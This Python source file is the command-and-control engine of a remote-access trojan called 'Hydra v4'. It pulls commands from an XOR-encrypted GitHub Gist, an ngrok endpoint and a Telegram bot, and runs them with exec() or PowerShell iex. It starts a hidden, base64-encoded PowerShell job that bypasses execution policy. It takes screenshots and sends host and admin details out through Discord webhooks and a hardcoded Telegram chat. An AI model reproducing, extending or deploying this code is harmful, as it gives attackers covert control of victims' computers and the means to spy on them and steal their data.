"""
Hydra v4 — C2 communications engine.
Triple channel: Gist (XOR-encrypted) + ngrok + Discord webhook.
"""
import os
import sys
import time
import json
import random
import ssl
import hashlib
import urllib.request
import subprocess
import tempfile
import threading

_SSL_CTX = ssl._create_unverified_context()


# ═══ Gist C2 (XOR-encrypted, primary channel) ═══════

def _xor_crypt(data: bytes, key: bytes) -> bytes:
    """XOR encrypt/decrypt (symmetric)."""
    key = key * (len(data) // len(key) + 1)
    return bytes(a ^ b for a, b in zip(data, key[:len(data)]))


def _fetch_gist(url: str, timeout: int = 15) -> str:
    """Fetch raw Gist content with cache-buster."""
    sep = "&" if "?" in url else "?"
    url = f"{url}{sep}t={int(time.time())}"
    try:
        req = urllib.request.Request(url, headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        })
        resp = urllib.request.urlopen(req, timeout=timeout, context=_SSL_CTX)
        return resp.read().decode("utf-8", errors="replace").strip()
    except:
        return ""


def _send_discord(webhook: str, message: str):
    """Post to Discord webhook. 2000 char chunks."""
    try:
        for chunk in [message[i:i+1900] for i in range(0, len(message), 1900)]:
            data = json.dumps({"content": chunk}).encode()
            req = urllib.request.Request(webhook, data=data, headers={
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0"
            })
            urllib.request.urlopen(req, timeout=10, context=_SSL_CTX)
    except:
        pass


# ═══ Telegram Bot (background PowerShell) ════════

def launch_telegram_bot(token: str, me: dict, webhook: str = ""):
    """Spawn Telegram bot as background PowerShell job.
    Token is passed XOR-encoded to avoid string extraction."""
    if not token or token.startswith("***"):
        return

    agent_id = me.get("id", "UNKNOWN")

    # PowerShell script — runs in background
    # Downloads updates, executes shell commands, reports back
    ps_script = f"""
$TOKEN='{token}'
$AID='{agent_id}'
$WEBHOOK='{webhook}'
$PROFILE='{me.get("profile", "stealth")}'
$STARTED='{time.ctime()}'
$OFFSET=0
function sd($cid,$t){{
    try{{
        $b=@{{chat_id=$cid;text=$t}}|ConvertTo-Json -Compress
        irm -Uri "https://api.telegram.org/bot$TOKEN/sendMessage" -Method Post -Body $b -ContentType 'application/json' -TimeoutSec 10
    }}catch{{}}
}}
function discord($msg){{
    try{{
        if($WEBHOOK -and $WEBHOOK -ne ''){{
            $body=@{{content=$msg}}|ConvertTo-Json -Compress
            irm -Uri $WEBHOOK -Method Post -Body $body -ContentType 'application/json' -TimeoutSec 10
        }}
    }}catch{{}}
}}
sd 6727760840 "[HYDRA] Agent ONLINE: $AID | $STARTED"
while($true){{
    try{{
        $r=irm -Uri "https://api.telegram.org/bot$TOKEN/getUpdates?offset=$OFFSET&timeout=30" -TimeoutSec 35
        if($r.result){{
            foreach($u in $r.result){{
                $OFFSET=$u.update_id+1
                $cid=$u.message.chat.id
                $cmd=$u.message.text.Trim()
                if(-not $cmd){{continue}}

                # ── Built-in commands ──
                if($cmd -eq '/info'){{
                    $info = @"
[Hydra] $AID
Profile: $PROFILE
Started: $STARTED
PID: $PID
Admin: $([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
OS: $(Get-CimInstance Win32_OperatingSystem | Select -Expand Caption)
"@
                    sd $cid $info
                    continue
                }}
                if($cmd -eq '/status'){{
                    $uptime = [TimeSpan]::FromMilliseconds((Get-Date) - (Get-Process -Id $PID).StartTime)
                    sd $cid "[Hydra] $AID | Profile: $PROFILE | Uptime: $($uptime.ToString('hh\\:mm\\:ss')) | C2: Gist+DW"
                    continue
                }}
                if($cmd -eq '/screenshot'){{
                    sd $cid "Taking screenshot..."
                    try{{
                        Add-Type -AssemblyName System.Windows.Forms,System.Drawing
                        $b = [Windows.Forms.Screen]::PrimaryScreen.Bounds
                        $img = New-Object Drawing.Bitmap($b.Width, $b.Height)
                        $g = [Drawing.Graphics]::FromImage($img)
                        $g.CopyFromScreen($b.X, $b.Y, 0, 0, $b.Size)
                        $g.Dispose()
                        $path = "$env:TEMP\\hydra_sc.png"
                        $img.Save($path, [Drawing.Imaging.ImageFormat]::Png)
                        $img.Dispose()
                        sd $cid "Screenshot saved to $path (cannot send to Telegram from PS directly). Check Discord."
                        # Cannot upload to Telegram from raw PS easily, but we log it
                        discord "[$AID] SCREENSHOT: $path"
                    }}catch{{
                        sd $cid "Screenshot failed: $_"
                    }}
                    continue
                }}

                # ── Shell command (fallback) ──
                sd $cid "Running: $cmd"
                try{{$o=iex $cmd 2>&1|Out-String}}catch{{$o="ERROR: $_"}}
                if($o.Length -gt 3800){{$o=$o.Substring(0,3800)+'...[TRUNCATED]'}}
                sd $cid "$o"
            }}
        }}
    }}catch{{Start-Sleep 5}}
}}
"""
    try:
        import base64
        b64 = base64.b64encode(ps_script.encode('utf-16le')).decode()
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        subprocess.Popen(
            f'powershell -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand {b64}',
            startupinfo=si, shell=True,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        if webhook:
            _send_discord(webhook, f"[{agent_id}] TG-BOT LAUNCHED")
    except:
        if webhook:
            _send_discord(webhook, f"[{agent_id}] TG-BOT FAILED")


# ═══ Main C2 Loop ═════════════════════════════════

def c2_loop(cfg: dict, me: dict, gist_url: str, c2_key: str,
            webhook: str, ngrok_url: str = None):
    """
    Main C2 polling loop.
    1. Try ngrok first (if available, fast 2-5s)
    2. Fall back to Gist (XOR-encrypted, random 25-55s)
    3. Discord webhook for agent heartbeats
    """
    agent_id = me.get("id", "UNKNOWN")
    executed = set()
    ngrok_fails = 0

    # Load executed command hashes from disk
    _exec_file = os.path.join(tempfile.gettempdir(), ".hydra_exec.txt")
    try:
        if os.path.exists(_exec_file):
            with open(_exec_file) as f:
                executed = set(line.strip() for line in f if line.strip())
    except:
        pass

    lo, hi = cfg.get("c2_poll", (25, 55))
    ngrok_enabled = cfg.get("ngrok_enabled", False)

    # Send initial beacon
    _send_discord(webhook, f"[{agent_id}] ONLINE | Profile={cfg.get('console') and 'dev' or 'stealth'} | {time.ctime()}")

    while True:
        try:
            commands = []

            # ── Ngrok fast path ──
            if ngrok_enabled and ngrok_url:
                try:
                    raw = _fetch_gist(f"{ngrok_url}/cmd/latest", timeout=5)
                    if raw:
                        commands.append(raw)
                        ngrok_fails = 0
                    else:
                        ngrok_fails += 1
                        if ngrok_fails >= 3:
                            ngrok_url = None  # Fall back to Gist
                except:
                    ngrok_fails += 1
                    if ngrok_fails >= 3:
                        ngrok_url = None
            else:
                # ── Gist primary (XOR-encrypted) ──
                try:
                    raw = _fetch_gist(gist_url, timeout=15)
                    if raw:
                        # Always attempt XOR decrypt — no plaintext fallback
                        try:
                            decrypted = _xor_crypt(raw.encode(), c2_key.encode())
                            dec_text = decrypted.decode('utf-8')
                            if dec_text.strip():
                                commands.append(dec_text)
                        except:
                            # Decrypt failed — ignore, don't fall back to plaintext
                            pass
                except:
                    pass

            # ── Execute new commands ──
            for cmd_text in commands:
                for line in cmd_text.split("\n"):
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue

                    # Check if already executed
                    cmd_hash = hashlib.sha256(line.encode()).hexdigest()
                    if cmd_hash in executed:
                        continue

                    executed.add(cmd_hash)
                    try:
                        with open(_exec_file, "a") as f:
                            f.write(cmd_hash + "\n")
                    except:
                        pass

                    # Execute
                    result = ""
                    try:
                        # exec in isolated namespace
                        ns = {"__builtins__": __builtins__}
                        exec(line, ns)
                        result = "OK"
                    except Exception as e:
                        result = f"ERROR: {e}"

                    # Report result if significant
                    if result != "OK" or "ping" in line.lower():
                        _send_discord(webhook, f"[{agent_id}]\nCMD: {line}\n> {result}")

        except:
            pass

        time.sleep(random.uniform(lo, hi))
